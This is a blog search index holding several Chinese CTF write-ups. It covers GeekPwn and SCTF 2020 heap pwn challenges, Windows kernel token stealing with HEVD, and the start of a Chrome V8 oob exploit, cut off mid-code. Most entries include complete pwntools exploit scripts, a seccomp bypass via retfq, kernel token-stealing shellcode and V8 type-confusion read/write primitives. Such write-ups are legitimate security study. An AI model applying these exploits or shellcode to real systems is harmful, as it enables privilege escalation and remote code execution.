<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[GeekPwn云靶场挑战赛线上赛 2020 PWN]]></title>
    <url>%2F2020%2F07%2F15%2Fgeekpwn2020%2F</url>
    <content type="text"><![CDATA[做了三个堆利用菜单题，难度不是很大，逃逸和提权的部分自己还属于小白水平，接下来一段时间应该多去学学内核和qemu了。 BabyPwn这道题首先在IDA静态分析发现show和del部分存在数组下溢，可以泄露部分数据，理所当然的先泄露了libc，写了个脚本跑了很多数，没有发现能够泄露PIE的下标，如果可以的话，这道题应该可以秒，然后发现在向堆中读取信息时存在逻辑漏洞if ( a2 - 1 &lt;= v5 ) break;很明显当a2(堆块大小)等于0时，即可堆溢出，这里直接想到了打top chunk然后劫持malloc_hook写one_gadget，本地成功后远程没有通过，然后就开始利用realloc调整rsp，试了好长时间没有办法，然后考虑其他办法，由于free_hook附近没有可以写top chunk的位置，想到了去打_IO_list_all，伪造一个IO和vtable然后直接exit调用IO OVERFLOW即可完成利用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *context.log_level = 'debug'prog = './pwn'p = process(prog)libc = ELF("../libc-2.23.so")def add(size, name, content): p.sendlineafter("Input your choice:", '1') p.sendlineafter("Member name:", name) p.sendlineafter("Description size:", str(size)) p.sendlineafter("Description:", content)def show(idx): p.sendlineafter("Input your choice:", '3') p.sendlineafter("index:", str(idx))def free(idx): p.sendlineafter("Input your choice:", '2') p.sendlineafter("index:", str(idx))def exp(): show(-5) p.recvuntil("The name:") libc.address = u64(p.recv(6)+'\x00'*2)-0x7f0bfafeb710+0x7f0bfac26000 log.info("libc.address ==&gt; " + hex(libc.address)) add(0, 'a', 'a') add(0, 'a', 'a') free(0) free(1) add(0, 'a', '\x20') show(0) p.recvuntil("The Description:") heap = u64(p.recv(6)+'\x00'*2) log.info("heap ==&gt; " + hex(heap)) add(0x40, 'a', 'a') add(0x30, 'a', 'a') free(0) free(1) free(2) main_arena = libc.address+0x7f0bfafeab20-0x7f0bfac26000 add(0,'a', '\x00'*0x18+p64(0x51)+p64(0x41)+'\x00'*0x40+p64(0x41)+p64(main_arena+24)) add(0x40,'a', 'a') add(0x30, 'a', 'a') target = libc.address-0x7f16a7da4000+0x7f16a8169500 add(0x38,'a','\x00'*0x30+p64(target-8))#3 add(0, 'a', '/bin/sh\x00'+p64(0)*3+p64(0)+p64(1)+'a'*144+p64(0)+'a'*0x10+p64(heap+0xd0)+p64(libc.sym['system'])*10)#4 add(0, 'a', p64(0)*3+p64(heap-0x10))#5 p.sendlineafter("Input your choice:", '4') p.interactive()if __name__ == '__main__': exp() PaperPrinter很有趣的一道题，我的做法是利用small bin和unsorted bin在mmap上制造mmap地址和libc地址，然后覆盖部分字节，创造出house of orange的条件 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *context.log_level = 'debug'prog = './pwn2'p = process(prog)libc = ELF("../libc-2.23.so")#p = remote("110.80.136.44", 16145) def edit(offset, size, content): p.sendlineafter("Input your choice:", '1') p.sendlineafter("Input the offset :", str(offset)) p.sendlineafter("Input the length :", str(size)) p.sendlineafter("Input the content :", content)def free(offset): p.sendlineafter("Input your choice:", '2') p.sendlineafter("Input the offset :", str(offset))def magic(): p.sendlineafter("Input your choice:", '3')def exp(): p.recvuntil("0x") sleep = int(p.recv(3), 16) byte = (sleep&lt;&lt;8)+0xa00000 print hex(byte) edit(0x400, 0x200, p64(0)+p64(0x141)+'a'*0x60+'\x00'*(0x130-0x60)+p64(0)+p64(0x21)+'\x00'*0x10+p64(0)+p64(0x21)) edit(0, 0x100, p64(0)+p64(0x91)+'\x00'*0x80+(p64(0)+p64(0x21))*3) edit(0xc0, 0x200, p64(0)+p64(0x91)+p64(0)*2+p64(0)+p64(0x91)+'\x00'*0x30+(p64(0)+p64(0x21))*8) free(0xd0) free(0xf0) free(0x410) magic() edit(0xf8, 3, p64(byte-0x86e60-0x10)) free(0x10) edit(0x18, 3, p64(byte+0x2f9310)) edit(0, 16, '/bin/sh\x00'+p64(0x61)) edit(0x20, 16, p64(2)+p64(3)) p.sendlineafter("Input your choice:", '4') p.interactive()if __name__ == '__main__': exp() PlayTheNewlibc-2.30的一道题，首先利用small bin在申请出一个chunk的同时会在bck-&gt;fd写入libc地址的特性，成功bypass check，可以在0x100000地址上写数据，然后后面就可以自由发挥了，我的做法是先通过environ泄露栈地址，然后rop调用mprotect，栈迁移回来执行shellcode 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *context.log_level = 'debug'prog = './pwn4'#p = process(prog,env=&#123;"LD_PRELOAD":"./libc.so"&#125;)context.arch = 'amd64'libc = ELF("./libc.so")p = remote("110.80.136.44", 13172) def add(idx, size, content='a'): p.sendlineafter("&gt; ", '1') p.sendlineafter("Input the index:", str(idx)) p.sendlineafter("input the size of basketball:", str(size)) p.sendlineafter("Input the dancer name:", content)def show(idx): p.sendlineafter("&gt; ", '3') p.sendlineafter("Input the idx of basketball:", str(idx))def edit(idx, content): p.sendlineafter("&gt; ", '4') p.sendlineafter("Input the idx of basketball:", str(idx)) p.sendafter("The new dance of the basketball:", content)def free(idx): p.sendlineafter("&gt; ", '2') p.sendlineafter("Input the idx of basketball:", str(idx))def readmmap(content): p.sendlineafter("&gt; ", '5') p.sendlineafter("Input the secret place:", content)def magic(): p.sendlineafter("&gt; ", '1638')def exp(): for i in range(6): add(0, 0x90) free(0) for i in range(7): add(0, 0x150) free(0) add(0, 0x150) add(1, 0x150) add(2, 0x150) add(3, 0x150) free(0) show(0) p.recvuntil("Show the dance:") libc.address = u64(p.recv(6)+'\x00'*2)-0x7f18e30c0be0+0x7f18e2ed6000 log.info("libc.address ==&gt; " + hex(libc.address)) add(1, 0xb0) free(2) show(2) p.recvuntil("Show the dance:") heap = u64(p.recv(6)+'\x00'*2) log.info("heap ==&gt; " + hex(heap)) add(1, 0xb0) add(1, 0xb0) edit(2, '\x00'*0xb0+p64(0)+p64(0x91)+p64(heap) + p64(0x100000-0x10)) add(1, 0x90) add(1, 0x100) free(1) edit(1, p64(libc.sym['__free_hook'])) readmmap(p64(0)+p64(libc.sym['puts'])+p64(libc.sym['environ'])) magic() stack = u64(p.recv(6)+'\x00'*2) log.info("stack ==&gt; " + hex(stack)) offset = 0x7ffec7032b28-0x7ffec7032c38 shellcode = "" shellcode += shellcraft.open("./flag") shellcode += shellcraft.read('rax', 'rsp', 0x50) shellcode += shellcraft.write(1, 'rsp', 0x50) readmmap(p64(0)+p64(libc.sym['gets'])+p64(stack+offset)+'\x00'*(0x100-0x20)+p64(0x100108)+asm(shellcode))#shellcode) #gdb.attach(p,'b* $rebase(0x18ac)') magic() pop_rdx_r12 = p64(libc.address + 0x11c421) pop_rdi = p64(libc.address + 0x26bb2) pop_rsi = p64(libc.address + 0x2709c) pop_rsp = p64(libc.address + 0x32c5a) sleep(0.1) p.sendline(pop_rdi+p64(0x100000)+pop_rsi+p64(0x1000)+pop_rdx_r12+p64(7)+p64(0)+p64(libc.sym['mprotect'])+pop_rsp+p64(0x100100)) p.interactive()if __name__ == '__main__': exp()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows kernel初探]]></title>
    <url>%2F2020%2F07%2F09%2Fwindows-kernel-1%2F</url>
    <content type="text"><![CDATA[学习一下windows kernel 提权原理类似于linux kernel中进程的特权由cred中uid等值管理，windows kernel在进程管理中有token值决定特权，但是其表示的值，并不像linux中一成不变，例如root权限为0，system权限的值需要我们可以通过查询一些具有system权限例如system进程的token值获得。这里采用windbg+virtualKD进行双机调试：通过!dml_proc查看当前进程： 1234567891011121: kd&gt; !dml_procAddress PID Image file name867ee8e8 4 System 8730e920 fc smss.exe 879d08f0 154 csrss.exe 87b96d40 188 wininit.exe 87b9b030 190 csrss.exe 87bd7d40 1d4 winlogon.exe 87bdad40 1e4 services.exe 87c05ad0 20c lsass.exe 87bfdb88 214 lsm.exe 87c4a900 280 svchost.exe 可以看到system进程的pid为4，这个经调试发现是一成不变的，我们后续可以通过这点来编写shellcode，然后我们继续查询进程信息，可以通过dt _EPROCESS 867ee8e8查看： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361: kd&gt; dt _EPROCESS 867ee8e8ntdll!_EPROCESS +0x000 Pcb : _KPROCESS +0x098 ProcessLock : _EX_PUSH_LOCK +0x0a0 CreateTime : _LARGE_INTEGER 0x01d655dd`d70e4c0f +0x0a8 ExitTime : _LARGE_INTEGER 0x0 +0x0b0 RundownProtect : _EX_RUNDOWN_REF +0x0b4 UniqueProcessId : 0x00000004 Void +0x0b8 ActiveProcessLinks : _LIST_ENTRY [ 0x8730e9d8 - 0x83f4ff18 ] +0x0c0 ProcessQuotaUsage : [2] 0 +0x0c8 ProcessQuotaPeak : [2] 0 +0x0d0 CommitCharge : 0xc +0x0d4 QuotaBlock : 0x83f43cc0 _EPROCESS_QUOTA_BLOCK +0x0d8 CpuQuotaBlock : (null) +0x0dc PeakVirtualSize : 0x7f1000 +0x0e0 VirtualSize : 0x270000 +0x0e4 SessionProcessLinks : _LIST_ENTRY [ 0x0 - 0x0 ] +0x0ec DebugPort : (null) +0x0f0 ExceptionPortData : (null) +0x0f0 ExceptionPortValue : 0 +0x0f0 ExceptionPortState : 0y000 +0x0f4 ObjectTable : 0x8b201b00 _HANDLE_TABLE +0x0f8 Token : _EX_FAST_REF +0x0fc WorkingSetPage : 0 +0x100 AddressCreationLock : _EX_PUSH_LOCK +0x104 RotateInProgress : (null) +0x108 ForkInProgress : (null) +0x10c HardwareTrigger : 0 +0x110 PhysicalVadRoot : 0x868102e0 _MM_AVL_TABLE +0x114 CloneRoot : (null) +0x118 NumberOfPrivatePages : 4 +0x11c NumberOfLockedPages : 0x40 +0x120 Win32Process : (null) +0x124 Job : (null) +0x128 SectionObject : (null) +0x12c SectionBaseAddress : (null) +0x130 Cookie : 0 +0x134 Spare8 : 0 +0x138 WorkingSetWatch : (null) +0x13c Win32WindowStation : (null) +0x140 InheritedFromUniqueProcessId : (null) +0x144 LdtInformation : (null) +0x148 VdmObjects : (null) +0x14c ConsoleHostProcess : 0 +0x150 DeviceMap : 0x8b2088d8 Void +0x154 EtwDataSource : (null) +0x158 FreeTebHint : 0x7ffe0000 Void +0x160 PageDirectoryPte : _HARDWARE_PTE_X86 +0x160 Filler : 0 +0x168 Session : (null) +0x16c ImageFileName : [15] &quot;System&quot; +0x17b PriorityClass : 0x2 &apos;&apos; +0x17c JobLinks : _LIST_ENTRY [ 0x0 - 0x0 ] +0x184 LockedPagesList : (null) +0x188 ThreadListHead : _LIST_ENTRY [ 0x867ee878 - 0x869d8f70 ] +0x190 SecurityPort : (null) +0x194 PaeTop : 0x83f54fc0 Void +0x198 ActiveThreads : 0x5f +0x19c ImagePathHash : 0 +0x1a0 DefaultHardErrorProcessing : 1 +0x1a4 LastThreadExitStatus : 0n0 +0x1a8 Peb : (null) +0x1ac PrefetchTrace : _EX_FAST_REF +0x1b0 ReadOperationCount : _LARGE_INTEGER 0x98 +0x1b8 WriteOperationCount : _LARGE_INTEGER 0x195 +0x1c0 OtherOperationCount : _LARGE_INTEGER 0x189c +0x1c8 ReadTransferCount : _LARGE_INTEGER 0x184f8f8 +0x1d0 WriteTransferCount : _LARGE_INTEGER 0x6c8080 +0x1d8 OtherTransferCount : _LARGE_INTEGER 0x751bd +0x1e0 CommitChargeLimit : 0 +0x1e4 CommitChargePeak : 0x4e +0x1e8 AweInfo : (null) +0x1ec SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO +0x1f0 Vm : _MMSUPPORT +0x25c MmProcessLinks : _LIST_ENTRY [ 0x8730eb7c - 0x83f4289c ] +0x264 HighestUserAddress : (null) +0x268 ModifiedPageCount : 0x58e44 +0x26c Flags2 : 0x2d800 +0x26c JobNotReallyActive : 0y0 +0x26c AccountingFolded : 0y0 +0x26c NewProcessReported : 0y0 +0x26c ExitProcessReported : 0y0 +0x26c ReportCommitChanges : 0y0 +0x26c LastReportMemory : 0y0 +0x26c ReportPhysicalPageChanges : 0y0 +0x26c HandleTableRundown : 0y0 +0x26c NeedsHandleRundown : 0y0 +0x26c RefTraceEnabled : 0y0 +0x26c NumaAware : 0y0 +0x26c ProtectedProcess : 0y1 +0x26c DefaultPagePriority : 0y101 +0x26c PrimaryTokenFrozen : 0y1 +0x26c ProcessVerifierTarget : 0y0 +0x26c StackRandomizationDisabled : 0y1 +0x26c AffinityPermanent : 0y0 +0x26c AffinityUpdateEnable : 0y0 +0x26c PropagateNode : 0y0 +0x26c ExplicitAffinity : 0y0 +0x270 Flags : 0x14040800 +0x270 CreateReported : 0y0 +0x270 NoDebugInherit : 0y0 +0x270 ProcessExiting : 0y0 +0x270 ProcessDelete : 0y0 +0x270 Wow64SplitPages : 0y0 +0x270 VmDeleted : 0y0 +0x270 OutswapEnabled : 0y0 +0x270 Outswapped : 0y0 +0x270 ForkFailed : 0y0 +0x270 Wow64VaSpace4Gb : 0y0 +0x270 AddressSpaceInitialized : 0y10 +0x270 SetTimerResolution : 0y0 +0x270 BreakOnTermination : 0y0 +0x270 DeprioritizeViews : 0y0 +0x270 WriteWatch : 0y0 +0x270 ProcessInSession : 0y0 +0x270 OverrideAddressSpace : 0y0 +0x270 HasAddressSpace : 0y1 +0x270 LaunchPrefetched : 0y0 +0x270 InjectInpageErrors : 0y0 +0x270 VmTopDown : 0y0 +0x270 ImageNotifyDone : 0y0 +0x270 PdeUpdateNeeded : 0y0 +0x270 VdmAllowed : 0y0 +0x270 CrossSessionCreate : 0y0 +0x270 ProcessInserted : 0y1 +0x270 DefaultIoPriority : 0y010 +0x270 ProcessSelfDelete : 0y0 +0x270 SetTimerResolutionLink : 0y0 +0x274 ExitStatus : 0n259 +0x278 VadRoot : _MM_AVL_TABLE +0x298 AlpcContext : _ALPC_PROCESS_CONTEXT +0x2a8 TimerResolutionLink : _LIST_ENTRY [ 0x0 - 0x0 ] +0x2b0 RequestedTimerResolution : 0 +0x2b4 ActiveThreadsHighWatermark : 0x65 +0x2b8 SmallestTimerResolution : 0 +0x2bc TimerResolutionStackRecord : (null) 其中偏移0xb4的位置为进程的pid，0xb8偏移处的ActiveProcessLinks作为指针指向下一个进程的ActiveProcessLinks处，0xf8为进程的token其类型为_EX_FAST_REF。这里我们为了验证修改进程token可以实现提权，打开一个cmd进程，并将其token改为system进程的token，首先查询system进程token： 123451: kd&gt; dt _EX_FAST_REF 867ee8e8+f8ntdll!_EX_FAST_REF +0x000 Object : 0x8b201267 Void +0x000 RefCnt : 0y111 +0x000 Value : 0x8b201267 同理，找到cmd进程的token所在位置为8805fa50+f8,使用ed 8805fa50+f8 0x8b201267修改其值，发现提权成功： shellcode调试shellcode编写就是通过汇编来实现我们以上的那些操作，从找到system进程的token到将此token覆盖掉当前进程token的这一过程。这部分内容参考thunderj师傅的文章https://thunderjie.github.io/2019/06/28/Windows-Kernel-Exploit/，详细过程可以去看师傅的解析，利用HEVD这个漏洞环境中的uaf漏洞，覆盖结构体中函数指针，从而实现类似于Linux kernel利用这ret2usr的操作来到达用户空间执行我们的shellcode(摘自thunderj师傅)： 12345678910111213141516171819202122232425262728void ShellCode()&#123; _asm &#123; nop nop nop nop pushad mov eax,fs:[124h] // 找到当前线程的_KTHREAD结构 mov eax, [eax + 0x50] // 找到_EPROCESS结构 mov ecx, eax mov edx, 4 // edx = system PID(4) // 循环是为了获取system的_EPROCESS find_sys_pid: mov eax, [eax + 0xb8] // 找到进程活动链表 sub eax, 0xb8 // 链表遍历 cmp [eax + 0xb4], edx // 根据PID判断是否为SYSTEM jnz find_sys_pid // 替换Token mov edx, [eax + 0xf8] mov [ecx + 0xf8], edx popad ret &#125;&#125; 这里我记录一下我的调试shellcode的办法，以免在shellcode执行中出现栈不平衡等问题导致crash，大家可以配合来看。首先为了方便调试我们在windbg中加入hevd的符号：然后我们就可以找到hevd中的函数，根据UAF漏洞的触发源码里得知是在UseUaFObjectNonPagedPool中由于修改了g_UseAfterFreeObjectNonPagedPool-&gt;Callback，我们最终调用了shellcode的执行，所以要在windbg中找到UseUaFObjectNonPagedPool。首先我们加载hevd驱动，找到hevd驱动信息： 123456789101112131415161718191: kd&gt; lm m HEVDBrowse full module liststart end module name9454b000 94595000 HEVD (private pdb symbols) d:\hevd.3.00\driver\vulnerable\x86\HEVD.pdb0: kd&gt; lmDvmHEVDBrowse full module liststart end module name9454b000 94595000 HEVD (deferred) Image path: HEVD.sys Image name: HEVD.sys Browse all global symbols functions data Timestamp: Tue Jul 2 20:19:05 2019 (5D1B4BB9) CheckSum: 0000C477 ImageSize: 0004A000 Translations: 0000.04b0 0000.04e4 0409.04b0 0409.04e4 Information from resource tables:Unable to enumerate user-mode unloaded modules, Win32 error 0n30 点击functions找到UseUaFObjectNonPagedPool函数，并利用bp指令下断点： 12345678910111213140: kd&gt; x /D HEVD!g* A B C D E F G H I J K L M N O P Q R S T U V W X Y Z9454e018 HEVD!g_ARWHelperObjectNonPagedPoolNx = struct _ARW_HELPER_OBJECT_NON_PAGED_POOL_NX *[65535]9458e014 HEVD!g_UseAfterFreeObjectNonPagedPool = 0x8693f4c89454d050 HEVD!GuardCheckLongJumpTargetImpl = 0x000000009458e018 HEVD!g_UseAfterFreeObjectNonPagedPoolNx = 0x000000009458fa2c HEVD!GetArbitraryReadWriteHelperObjecNameNonPagedPoolNxIoctlHandler (struct _IRP *, struct _IO_STACK_LOCATION *)945930ea HEVD!GsDriverEntry (struct _DRIVER_OBJECT *, struct _UNICODE_STRING *)9458fa4c HEVD!GetFreeIndex (void)9458fa6a HEVD!GetIndexFromPointer (void *)9458f912 HEVD!GetArbitraryReadWriteHelperObjecNameNonPagedPoolNx (struct _ARW_HELPER_OBJECT_IO *)0: kd&gt; dt 9458e014Symbol not found at address 9458e014. 运行程序暂停的断点位置，然后我们找到HEVD!g_UseAfterFreeObjectNonPagedPool变量，查看现在它的值，可以发现已经被我们更改： 12340: kd&gt; dx -r1 ((HEVD!_USE_AFTER_FREE_NON_PAGED_POOL *)0x8693f4c8)((HEVD!_USE_AFTER_FREE_NON_PAGED_POOL *)0x8693f4c8) : 0x8693f4c8 [Type: _USE_AFTER_FREE_NON_PAGED_POOL *] [+0x000] Callback : 0x1341195 [Type: void (*)(...)] [+0x004] Buffer : &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; [Type: char [84]] 可以用uf 0x1341195查看callback里的函数指令，我们在该处下断点就可以调试我们的shellcode了。]]></content>
      <tags>
        <tag>windows kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SCTF 2020 PWN]]></title>
    <url>%2F2020%2F07%2F07%2FSCTF-2020-PWN%2F</url>
    <content type="text"><![CDATA[跟着队伍参加了这次SCTF，做了两个PWN，分别是linux和win平台下的堆利用题目（linux考察的是shellcode），运气好抢到了一个一血（不过貌似不是前5个一血，没有书恰，难顶。） EasyWinHeap在看到这道题之前其实对win平台下的pwn利用几乎没有任何了解，所以能做出这道题多多少少沾点运气，就简单说一下我的思路吧，下面推荐了当时做题时候看的学习资料（师傅们tql），来说明其中原理。在代码审计过程发现程序存在uaf和堆溢出，而且结合程序中在堆里面申请了一个0x80的空间用来存放堆指针和程序的功能函数指针puts，可以想到如果我们能劫持这个堆块，覆盖掉puts函数指针就可以任意函数调用，而且参数也可控制。在简单的学习了windows heap结构，发现有一个unlink的操作似乎我们可以利用，我们可以修改破坏free chunk的链表环状结构，制造一个我们的链表，从而当unlink时就可以修改其他堆块中的内容，因为有uaf我们可以泄露free chunk的内容得到堆地址，经过在od中简单调试，果然可以直接劫持开头的0x80的堆块，这样就可以肆无忌惮的任意读写内容。之后的任务就顺利成章，先是泄露puts iat表的内容可以得到puts的真实地址，然后通过计算得到dll文件的加载基址，就可以得到system地址了。 推荐两个比较好的win10 heap exploitation学习：angelboy师傅的：https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-chinese-versionkirin师傅的：https://kirin-say.top/2020/01/01/Heap-in-Windows/ 完整EXP(需要在堆地址为4字节时在可以打通)： 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *#context.log_level = 'debug'p = remote("47.94.245.208", 23333) def add(size): p.sendlineafter("option &gt;\r\n", '1') p.sendlineafter("size &gt;\r\n", str(size))def show(idx): p.sendlineafter("option &gt;\r\n", '3') p.sendlineafter("index &gt;\r\n", str(idx))def free(idx): p.sendlineafter("option &gt;\r\n", '2') p.sendlineafter("index &gt;\r\n", str(idx))def edit(idx, content): p.sendlineafter("option &gt;\r\n", '4') p.sendlineafter("index &gt;\r\n", str(idx)) p.sendlineafter("content &gt;\r\n", content)def exp(): for i in range(6): add(32) free(2) free(4) show(2) heap_addr = u32(p.recvuntil("\r", drop=True)[:4]) log.info("heap_addr ==&gt; " + hex(heap_addr)) edit(2, p32(heap_addr-0xd8)+p32(heap_addr-0xd4)) free(1) show(2) p.recv(4) image_base = u32(p.recv(4))-0x1043 log.info("image_base ==&gt; " + hex(image_base)) puts_iat = image_base + 0x20c4 log.info("puts_iat ==&gt; " + hex(puts_iat)) edit(2, p32(puts_iat)+p32(image_base+0x1040)+p32(heap_addr-0xe8)) show(2) ucrtbase = u32(p.recv(4))-0xb89f0 log.info("ucrtbase ==&gt; " + hex(ucrtbase)) system = ucrtbase+0xefda0 edit(0, 'cmd\x00') edit(3, p32(system)+p32(heap_addr-0x60)) show(0) p.interactive()if __name__ == '__main__': exp() coolcode漏洞点漏洞点很好找，在申请堆块的函数中，对数组下标错误的使用了有符号数，导致如果我们输入负数也可以满足v1 &lt;= 1这样的检测，而在数组上方保存了例如stdin\stdout\stderr、got表等这样的可利用信息，最开始我的想法是覆盖stdin然后通过劫持IOFILE结构体实现ROP，经队友提醒，这个程序并没有开启FULL RELRO所以got表可写，这样其实我们可以直接劫持got表。程序在我们输入信息中加入了check，限制了输入的字符（只能是大写字母和数字），如果不符合便执行exit()，这很大程度影响了我们的shellcode编写，不过我们只需要将exit_got改成ret就可以绕过，程序中heap和一段bss是rwx权限，我们可以任意在其中编写shellcode，然后通过劫持got表进行调用，可以用的函数有很多，我这里采用了free() 沙箱绕过程序中运用了prctl来限制了我们能使用的系统调用： 12345678910 line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000000 A = sys_number 0001: 0x15 0x04 0x00 0x00000001 if (A == write) goto 0006 0002: 0x15 0x03 0x00 0x00000000 if (A == read) goto 0006 0003: 0x15 0x02 0x00 0x00000009 if (A == mmap) goto 0006 0004: 0x15 0x01 0x00 0x00000005 if (A == fstat) goto 0006 0005: 0x06 0x00 0x00 0x00050005 return ERRNO(5) 0006: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0007: 0x06 0x00 0x00 0x00000000 return KILL 可以看到这里面只允许了部分系统调用通过，因为没有open，我们无法使用常规的orw读取flag，但是其实只要查询系统调用号表，就可发现fstat这个函数对应的系统调用号5，其实就是32位程序中open的系统调用号，而汇编中存在一条指令retfq可以供我们切换到32位指令模式，其原理是一个cs寄存器，cs=0x23时表示32位模式，cs=0x33时表示64位模式，我们只需要在进行retfq时保证此时rsp=shellcode地址，rsp+8=0x23/0x33，就可以在我们想要的模式下执行shellcode。这道题我们的思路就很清晰：因为程序限定了读取字节长度，为了方便一次性执行shellcode，我们先写入read将后面shellcode写入到bss段并执行。shellcode的内容：首先切换32位模式执行open()然后切换回64位执行read()、write()即可读取到flag 完整exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import *context.os = 'linux'prog = './CoolCode'#p = process(prog)p = remote("39.107.119.192 ", 9999) def add(idx, content): p.sendlineafter("choice :", '1') p.sendlineafter("Index: ", str(idx)) p.sendafter("messages: ", content)def show(idx): p.sendlineafter("choice :", '2') p.sendlineafter("Index: ", str(idx))def free(idx): p.sendlineafter("choice :", '3') p.sendlineafter("Index: ", str(idx))def exp(): read = ''' xor eax, eax mov edi, eax push 0x60 pop rdx mov esi, 0x1010101 xor esi, 0x1612601 syscall mov esp, esi retfq ''' open_x86 = ''' mov esp, 0x602770 push 0x67616c66 push esp pop ebx xor ecx,ecx mov eax,5 int 0x80 ''' readflag = ''' push 0x33 push 0x60272e retfq mov rdi,0x3 mov rsi,rsp mov rdx,0x60 xor rax,rax syscall mov rdi,1 mov rax,1 syscall ''' readflag = asm(readflag, arch = 'amd64') add(-22, '\xc3') add(-37, asm(read, arch = 'amd64')) gdb.attach(p) free(0) payload = p64(0x602710)+p64(0x23)+asm(open_x86)+readflag p.sendline(payload) p.interactive()if __name__ == '__main__': exp()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Starctf-oob-Chrome V8学习]]></title>
    <url>%2F2020%2F03%2F20%2Fstarctf-chrome-oob%2F</url>
    <content type="text"><![CDATA[以一道starctf 2018 oob开始入门学习chrome v8 漏洞分析题目给出了一个diff，关键代码为： 123456789101112131415161718192021+BUILTIN(ArrayOob)&#123;+ uint32_t len = args.length();+ if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();+ Handle&lt;JSReceiver&gt; receiver;+ ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+ isolate, receiver, Object::ToObject(isolate, args.receiver()));+ Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);+ FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());+ uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());+ if(len == 1)&#123;+ //read+ return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));+ &#125;else&#123;+ //write+ Handle&lt;Object&gt; value;+ ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+ isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));+ elements.set(length,value-&gt;Number());+ return ReadOnlyRoots(isolate).undefined_value();+ &#125;+&#125; 作用是给js的array加入了一个新方法，而操作直接取了length，大概可以猜测是一个越界读写，通过测试证实确实可以越界读写到数组元素的下八个字节。 类型混淆v8是通过map来判断类型，如果我们可以任意读写map，就可以制造出类型混淆。例如： 1.将对象数组的map替换成浮点型数组的map，当读取对象数组的元素是会将对象地址当作浮点值，这样就可以泄露任意对象的地址。2.将浮点型数组的map替换成对象数组的map，原浮点型数组的元素浮点数会被当作对象地址来看待，这样就可以构造出任意地址为对象，加以构造即可以实现任意地址写。 任意读写有了上面的类型混淆利用，我们可以泄露任意对象地址和构造出任意地址的对象。这样我们分配一个Array(记为Array1)，然后泄露Array1地址出来，再利用任意构造地址对象，在Array1内部构造出来一个Array2，使得Array2在Array1的可控范围之内，Array2的element地址可以由我们任意修改，这样就可以通过控制Array2来实现任意读写。 wasm有了任意读写的办法，就需要找到去执行shellcode的办法，通过学习知道v8中可以直接执行wasm。在https://wasdk.github.io/WasmFiddle/中可以直接将C语言转换成wasm代码，网站也给了实例： 1234var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule, wasmImports);log(wasmInstance.exports.main()); 通过泄露对象地址我们可以得到wasm函数的接口地址。在经过Function–&gt;shared_info–&gt;WasmExportedFunctionData–&gt;instance这样的函数调用查找，最终在instance+0x88处找到了一块RWX内存，我们将shellcode写入，再次调用wasm的接口即可触发shellcode了。 exp：（主要仿造自https://paper.seebug.org/9463） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374var buff_area = new ArrayBuffer(0x10);var fl = new Float64Array(buff_area);var ui = new BigUint64Array(buff_area);var obj = &#123;&quot;A&quot;:1&#125;;var obj_fake_arr = [obj];var fake_array_all = [1.1,2,3];var luckyu = [1,2,3,4]var obj_map = obj_fake_arr.oob();var float_fake_array_map = fake_array_all.oob();function ftoi(floo)&#123; fl[0] = floo; return ui[0];&#125;function itof(infake_arr)&#123; ui[0] = infake_arr; return fl[0];&#125;function hex(data)&#123; return &quot;0x&quot;+data.toString(16);&#125;function leak_obj(fake_arr)&#123; //泄漏对象地址 obj_fake_arr[0] = fake_arr; obj_fake_arr.oob(float_fake_array_map); let leak_obj_addr = obj_fake_arr[0]; obj_fake_arr.oob(obj_map); return ftoi(leak_obj_addr);&#125;function fake_obj(fake_arr)&#123; //构造对象 fake_array_all[0] = itof(fake_arr); fake_array_all.oob(obj_map); let fake_obj_addr = fake_array_all[0]; fake_array_all.oob(float_fake_array_map); return fake_obj_addr;&#125;function write(addr,data)&#123; let r = fake_obj(leak_obj(fake_arr)-0x20n); fake_arr[2] = itof(addr-0x10n); r[0] = itof(data);&#125;function read(addr)&#123; let w = fake_obj(leak_obj(fake_arr)-0x20n); fake_arr[2] = itof(addr-0x10n); return ftoi(w[0]);&#125;var fake_arr = [float_fake_array_map,1.1,2.2,3.3];var wasmCode = new 